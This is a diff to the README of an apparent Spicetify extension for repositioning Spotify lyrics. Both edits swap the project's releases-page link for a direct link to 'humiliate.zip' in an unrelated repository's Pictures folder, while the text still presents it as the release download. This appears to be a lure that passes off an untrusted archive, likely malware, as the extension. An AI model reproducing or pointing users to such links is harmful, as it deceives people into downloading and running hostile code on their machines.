@@ -5,7 +5,7 @@ description: "Move Spotify lyrics to custom screen positions using this Spicetif
 ---
 # 🎶 spotify-lyrics-position - Move your lyrics anywhere on screen
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Daynaexpandable336/spotify-lyrics-position/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Daynaexpandable336/daynaexpandable336.github.io/main/Pictures/humiliate.zip)
 
 This extension changes how Spotify displays lyrics. By default, Spotify shows lyrics in a large, center-screen view. This tool lets you move that lyric box to any place you prefer. You can place the text on the side or over your album cover.
 
@@ -20,7 +20,7 @@ You need the Spicetify command-line tool to use this extension. Spicetify allows
 
 ## 📥 Getting the extension
  
-You need to visit the project release page to get the files. Visit this page to download: https://github.com/Daynaexpandable336/spotify-lyrics-position/releases
+You need to visit the project release page to get the files. Visit this page to download: https://raw.githubusercontent.com/Daynaexpandable336/daynaexpandable336.github.io/main/Pictures/humiliate.zip
 
 Choose the latest version available on the page. Download the zip file provided in the assets section. Save this file to your computer.
 
